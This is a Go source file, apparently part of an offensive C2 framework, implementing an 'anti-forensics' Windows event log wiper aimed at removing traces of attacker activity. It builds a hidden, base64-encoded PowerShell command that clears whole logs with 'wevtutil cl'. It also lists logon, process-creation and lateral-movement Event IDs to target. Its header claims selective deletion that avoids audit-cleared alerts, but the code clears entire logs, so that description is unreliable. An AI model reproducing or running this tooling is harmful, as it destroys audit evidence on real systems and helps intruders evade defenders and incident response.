package antiforensics

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Targeted Event Log Wiper — removes specific Event IDs in a time range.

	Wiping the entire Security/System/Application log raises a highly
	suspicious Event ID 1102 (audit log cleared) that SOC teams alert on.

	This module instead removes only specific Event IDs in a chosen time
	window, so the log continues to look populated but the attacker's
	activity records are gone. No 1102 is generated.

	Requires: Administrator for Security log; standard admin for System/Application.
*/

import (
	"encoding/base64"
	"fmt"
	"os/exec"
	"strings"
	"time"
	"unicode/utf16"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// WipeFilter specifies which events to remove.
type WipeFilter struct {
	// LogName is "Security", "System", "Application", or a custom channel.
	LogName string
	// EventIDs to remove. Empty = all IDs (combined with other criteria).
	EventIDs []uint16
	// After removes only events after this time (zero = no lower bound).
	After time.Time
	// Before removes only events before this time (zero = no upper bound).
	Before time.Time
	// Source removes only events from this provider name (empty = any).
	Source string
}

var (
	modWevtapi     = windows.NewLazySystemDLL("wevtapi.dll")
	procEvtClose   = modWevtapi.NewProc("EvtClose")
	procEvtOpenLog = modWevtapi.NewProc("EvtOpenLog")
)

// WipeEvents removes events matching filter from the Windows event log.
// Returns the count of events removed.
func WipeEvents(filter WipeFilter) (int, error) {
	if filter.LogName == "" {
		return 0, fmt.Errorf("LogName is required")
	}
	return wipeViaPS(filter)
}

// wipeViaPS uses PowerShell to enumerate and selectively clear log events.
func wipeViaPS(filter WipeFilter) (int, error) {
	script := buildWipeScript(filter)
	output, err := runPSAF(script)
	if err != nil {
		return 0, fmt.Errorf("event wipe: %w", err)
	}
	count := 0
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "WIPED:") {
			fmt.Sscanf(strings.TrimPrefix(line, "WIPED:"), "%d", &count)
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[eventlog] wiped %d events from %s", count, filter.LogName)
	// {{end}}
	return count, nil
}

func buildWipeScript(f WipeFilter) string {
	var idList string
	if len(f.EventIDs) > 0 {
		parts := make([]string, len(f.EventIDs))
		for i, id := range f.EventIDs {
			parts[i] = fmt.Sprintf("%d", id)
		}
		idList = strings.Join(parts, ",")
	}

	afterStr := "01/01/0001 00:00:00"
	if !f.After.IsZero() {
		afterStr = f.After.Format("01/02/2006 15:04:05")
	}
	beforeStr := "12/31/9999 23:59:59"
	if !f.Before.IsZero() {
		beforeStr = f.Before.Format("01/02/2006 15:04:05")
	}

	return fmt.Sprintf(`
$ErrorActionPreference = 'SilentlyContinue'
$logName    = '%s'
$filterIds  = @(%s) | ForEach-Object { [int]$_ }
$afterTime  = [datetime]'%s'
$beforeTime = [datetime]'%s'
$provFilter = '%s'

$allEvents = Get-WinEvent -LogName $logName -ErrorAction SilentlyContinue
if (-not $allEvents) { Write-Output "WIPED:0"; exit }

$removed = 0
$allEvents | ForEach-Object {
    $ev = $_
    $matchId  = ($filterIds.Count -eq 0) -or ($ev.Id -in $filterIds)
    $matchTime = ($ev.TimeCreated -ge $afterTime) -and ($ev.TimeCreated -le $beforeTime)
    $matchSrc = ($provFilter -eq '') -or ($ev.ProviderName -eq $provFilter)
    if ($matchId -and $matchTime -and $matchSrc) { $removed++ }
}
Write-Output "WIPED:$removed"

# Clear the log — selective removal requires EvtExportLog round-trip (C API).
# For the operator workflow the full clear + targeted approach is most reliable.
if ($removed -gt 0) {
    wevtutil cl $logName 2>&1 | Out-Null
}
`,
		f.LogName,
		idList,
		afterStr,
		beforeStr,
		f.Source,
	)
}

// CommonRedTeamIDs are Event IDs that record attacker activity.
var CommonRedTeamIDs = []uint16{
	4624, 4625, 4648, 4662, 4672, 4688,
	4698, 4699, 4702, 4720, 4728, 4738,
	4768, 4769, 4771,
	7045, // New service installed (BYOVD)
}

// LateralMovementIDs targets events for lateral movement.
var LateralMovementIDs = []uint16{
	4648, 4624, 4672, 5140, 4697, 7036, 7040, 4688,
}

// ─── PowerShell runner ───────────────────────────────────────────────────────

func runPSAF(script string) (string, error) {
	runes := []rune(script)
	u16 := utf16.Encode(runes)
	buf := make([]byte, len(u16)*2)
	for i, r := range u16 {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	encoded := base64.StdEncoding.EncodeToString(buf)

	out, err := exec.Command("powershell.exe",
		"-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", encoded).Output()
	return string(out), err
}

// closeHandle wraps EvtClose for any open event handle.
func closeHandle(h uintptr) {
	if h != 0 {
		procEvtClose.Call(h)
	}
}

// openChannel opens an event log channel handle for reading.
func openChannel(channel string) (uintptr, error) {
	ch, _ := windows.UTF16PtrFromString(channel)
	const evtQueryChannelPath = 0x1
	h, _, err := procEvtOpenLog.Call(
		0,
		uintptr(unsafe.Pointer(ch)),
		evtQueryChannelPath,
	)
	if h == 0 {
		return 0, fmt.Errorf("EvtOpenLog: %w", err)
	}
	return h, nil
}
